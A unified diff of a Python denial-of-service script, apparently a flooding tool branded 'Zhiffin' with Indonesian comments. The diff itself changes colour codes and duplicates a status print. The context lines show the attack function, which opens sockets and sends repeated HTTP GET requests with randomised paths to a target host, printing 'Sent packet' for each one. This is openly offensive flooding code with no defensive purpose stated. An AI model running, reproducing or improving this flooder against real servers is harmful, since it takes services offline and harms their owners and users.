@@ -83,10 +83,12 @@ def print_status():
     thread_num += 1
     #print output pada baris yang sama
     sys.stdout.write(f" {time.ctime().split()[3]} [{str(thread_num)}]")
-    print(f"  \033[97mZhiffin  \033[95mSent packet::.. " +ip+ "\033[0m" )
+    print(f"  \033[93mZhiffin  \033[97mSent packet:. " +ip+ "\033[0m" )
+    sys.stdout.flush()
+    sys.stdout.write(f" {time.ctime().split()[3]} [{str(thread_num)}]")
+    print(f"  \033[93mZhiffin  \033[97mSent packet::.. " +ip+ "\033[0m" )
     sys.stdout.flush()
     thread_num_mutex.release()
-    
 
 # Hasilkan Jalur URL
 def generate_url_path():
@@ -111,7 +113,7 @@ def attack():
         byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
         dos.send(byt)
     except socket.error:
-        print (f"\093[4m [ No connection, server may be down ]: {str(socket.error)}\033[0m")
+        print (f" [ No connection, server may be down ]: {str(socket.error)}")
     finally:
         # Tutup soket dengan rapi
         dos.shutdown(socket.SHUT_RDWR)
